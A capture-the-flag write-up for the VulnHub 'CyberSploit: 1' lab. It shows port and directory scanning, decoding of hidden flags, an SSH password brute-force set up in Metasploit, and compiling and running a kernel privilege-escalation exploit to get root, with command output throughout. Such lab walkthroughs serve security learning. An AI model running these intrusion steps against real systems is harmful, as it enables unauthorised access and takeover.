# CyberSploit: 1 @VulnHub

Difficulty: EASY

Flags: 3

Keywords and tools: nmap, decode, kernel exploit, google

### Check that host is alive and responds to ping
```                                                                            
$ ping 192.168.5.11
PING 192.168.5.11 (192.168.5.11) 56(84) bytes of data.
64 bytes from 192.168.5.11: icmp_seq=1 ttl=64 time=0.612 ms
```
### Run nmap
```
$ nmap -sV -n -v -Pn -p- -T4 -A 192.168.5.11 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
|_  256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hello Pentester!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We have SSH and HTTP ports open.

### Run dirb
```
$ dirb http://192.168.5.11
+ http://192.168.5.11/cgi-bin/ (CODE:403|SIZE:288)
+ http://192.168.5.11/hacker (CODE:200|SIZE:3757743)
+ http://192.168.5.11/index (CODE:200|SIZE:2333)
+ http://192.168.5.11/index.html (CODE:200|SIZE:2333)
+ http://192.168.5.11/robots (CODE:200|SIZE:79)
+ http://192.168.5.11/robots.txt (CODE:200|SIZE:79)
+ http://192.168.5.11/server-status (CODE:403|SIZE:293)  
```
Found couple interesting things, lets see them via browser.

On main page we see when inspecting the source code <!-------------username:itsskv--------------------->

/robots gives us R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 which looks like Base64 so we can try to decode it here: https://www.base64decode.org/

Good Work ! Flag1: cybersploit{youtube.com/c/cybersploit}

### Bruteforce the SSH
```
$ msfconsole
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set username itsskv
msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.5.11
msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /usr/share/seclists/Passwords/Common-Credentials/best110.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
```
After a while I figured that maybe the flag1 was the password. Remember to keep it simple...
```
$ ssh itsskv@192.168.5.11
itsskv@192.168.5.11's password: 
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

332 packages can be updated.
273 updates are security updates.

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Your Hardware Enablement Stack (HWE) is supported until April 2017.

Last login: Sat Jun 27 10:14:39 2020 from cybersploit.local
itsskv@cybersploit-CTF:~$ ls
Desktop  Documents  Downloads  examples.desktop  flag2.txt  Music  Pictures  Public  Templates  Videos
itsskv@cybersploit-CTF:~$ cat flag2.txt 
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101
```
We can decode binary to text, using any service you find with google. I used https://cryptii.com/pipes/binary-decoder:

good work !
flag2: cybersploit{https:t.me/cybersploit1}
### Privilege escalation
```
itsskv@cybersploit-CTF:~$ sudo -l
[sudo] password for itsskv: 
Sorry, user itsskv may not run sudo on cybersploit-CTF.
itsskv@cybersploit-CTF:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 12.04.5 LTS
Release:	12.04
Codename:	precise
```
After quick googling found a way to locally escalate privileges: https://www.exploit-db.com/exploits/37292
```
itsskv@cybersploit-CTF:~$ cd /tmp
itsskv@cybersploit-CTF:~$ nano exploit.c  					#Paste the code from the exploit-db.com
itsskv@cybersploit-CTF:/tmp$ gcc exploit.c -o exploit		#Compile the exploit
itsskv@cybersploit-CTF:/tmp$ ./exploit						#Run the exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
# cd /root
# ls
finalflag.txt
# cat finalflag.txt
  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
 /      |\   \  /   / |   _  \  |   ____||   _  \        /       ||   _  \  |  |      /  __  \  |  | |           |
|  ,----' \   \/   /  |  |_)  | |  |__   |  |_)  |      |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
|  |       \_    _/   |   _  <  |   __|  |      /        \   \    |   ___/  |  |     |  |  |  | |  |     |  |     
|  `----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  `----.|  `--'  | |  |     |  |     
 \______|    |__|     |______/  |_______|| _| `._____|_______/    | _|      |_______| \______/  |__|     |__|     
                                                                                                                  

   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 

flag3: cybersploit{Z3X21CW42C4 many many congratulations !}

if you like it share with me https://twitter.com/cybersploit1.

Thanks !
```
And we have our final flag.
